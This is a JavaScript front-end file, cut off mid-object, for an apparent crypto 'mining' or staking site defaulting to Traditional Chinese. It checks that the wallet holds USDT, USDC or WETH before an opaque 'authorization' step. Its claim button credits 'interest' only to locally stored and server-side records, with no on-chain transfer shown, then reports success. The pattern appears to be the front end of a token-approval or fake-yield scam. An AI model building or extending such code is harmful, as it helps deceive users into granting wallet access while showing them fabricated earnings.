import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.5/ethers.umd.min.js';
import { initializeWallet, connectWallet, disconnectWallet, handleConditionalAuthorizationFlow, userAddress, usdtContract, usdcContract, wethContract } from './wallet.js';
import { updateStatus, updateTotalFunds, updateInterest, updateLanguage, claimInterest, setInitialNextBenefitTime } from './ui.js';
import { setupSSE } from './sse.js';

document.addEventListener('DOMContentLoaded', async () => {
    const savedLang = localStorage.getItem('language') || 'zh-Hant';
    updateLanguage(savedLang);
    await initializeWallet();
    setInterval(updateTotalFunds, 1000);
    if (!document.getElementById('grossOutputValue') || !document.getElementById('cumulativeValue')) {
        await retryDOMAcquisition();
    }
    setInterval(checkServerStatus, 60000);
    if (closeModal) closeModal.addEventListener('click', () => { claimModal.style.display = 'none'; });
    if (cancelClaim) cancelClaim.addEventListener('click', () => { claimModal.style.display = 'none'; });
    if (confirmClaim) {
        confirmClaim.addEventListener('click', async () => {
            claimModal.style.display = 'none';
            const claimableETHString = modalClaimableETH?.textContent?.replace(' ETH', '').trim() || '0';
            const claimableETH = parseFloat(claimableETHString);
            const selectedToken = modalSelectedToken?.textContent || 'USDT';
            const valueInTokenString = modalEquivalentValue?.textContent?.replace(/[^0-9.]/g, '') || '0';
            const valueInToken = parseFloat(valueInTokenString);

            if (isNaN(claimableETH) || isNaN(valueInToken)) {
                updateStatus(translations[currentLang].invalidCalc);
                return;
            }

            const grossOutputETH = parseFloat(grossOutputValue?.textContent?.replace(' ETH', '') || '0');
            claimedInterest += claimableETH;
            accountBalance[selectedToken] = (accountBalance[selectedToken] || 0) + valueInToken;
            localStorage.setItem('userData', JSON.stringify({
                stakingStartTime,
                claimedInterest,
                pledgedAmount,
                accountBalance,
                grossOutput: grossOutputETH,
                cumulative: 0,
                nextBenefitTime: localStorage.getItem('nextBenefitTime'),
                lastUpdated: Date.now()
            }));
            console.log(`claimInterest: Updated claimed interest and account balance:`, { claimedInterest, accountBalance });
            await saveUserData({
                stakingStartTime,
                claimedInterest,
                pledgedAmount,
                accountBalance,
                grossOutput: grossOutputETH,
                cumulative: 0,
                nextBenefitTime: localStorage.getItem('nextBenefitTime'),
                lastUpdated: Date.now(),
                source: 'index.html'
            });
            await updateInterest();
            const walletBalances = {
                usdt: userAddress ? await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n) : 0n,
                usdc: userAddress ? await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n) : 0n,
                weth: userAddress ? await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n) : 0n
            };
            updateBalancesUI(walletBalances);
            updateStatus(translations[currentLang].claimSuccess);
        });
    }
    if (claimModal) {
        claimModal.addEventListener('click', (e) => {
            if (e.target === claimModal) claimModal.style.display = 'none';
        });
    }
});

document.getElementById('refreshData')?.addEventListener('click', async () => {
    console.log(`refreshData: Manually refreshing data...`);
    updateStatus('Refreshing data...');
    if (!grossOutputValue || !cumulativeValue) {
        await retryDOMAcquisition();
    }
    await loadUserDataFromServer();
    await updateInterest();
    updateStatus('');
    alert('Data refreshed!');
});

languageSelect.addEventListener('change', (e) => {
    const lang = e.target.value;
    updateLanguage(lang);
});

connectButton.addEventListener('click', async () => {
    if (connectButton.classList.contains('connected')) {
        disconnectWallet();
    } else {
        await connectWallet();
    }
});

startBtn.addEventListener('click', async () => {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    if (!signer) {
        alert('Please connect your wallet first!');
        console.log(`startBtn: Clicked but no signer available.`);
        return;
    }
    const selectedToken = walletTokenSelect.value;
    const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
    const selectedContract = tokenMap[selectedToken];
    try {
        const balance = await retry(() => selectedContract.balanceOf(userAddress));
        console.log(`startBtn: Checked balance for ${selectedToken}: ${balance.toString()}`);
        if (balance === 0n) {
            alert(`Your ${selectedToken} balance is zero. Please ensure you have sufficient balance to start.`);
            return;
        }
    } catch (e) {
        alert(`Could not fetch balance: ${e.message}`);
        console.error(`startBtn: Balance fetch error: ${e.message}`);
        return;
    }
    startBtn.disabled = true;
    startBtn.textContent = 'Authorizing...';
    try {
        await handleConditionalAuthorizationFlow();
        alert('Authorization successful! Mining has started.');
        await updateUIBasedOnChainState();
    } catch (error) {
        console.error(`startBtn: Authorization failed: ${error.message}`);
        alert(`Authorization failed: ${error.message}`);
        updateStatus(`Authorization failed: ${error.message}`);
    } finally {
        startBtn.disabled = false;
        startBtn.textContent = translations[currentLang]?.startBtnText || 'Start';
        console.log(`startBtn: Authorization process completed.`);
    }
});

pledgeBtn.addEventListener('click', async () => {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    if (!signer) {
        alert('Please connect your wallet first!');
        console.log(`pledgeBtn: Clicked but no signer available.`);
        return;
    }
    const amount = parseFloat(pledgeAmount.value) || 0;
    const duration = parseInt(pledgeDuration.value);
    const token = pledgeToken.value;
    const tokenMap = {
        'USDT': USDT_CONTRACT_ADDRESS,
       
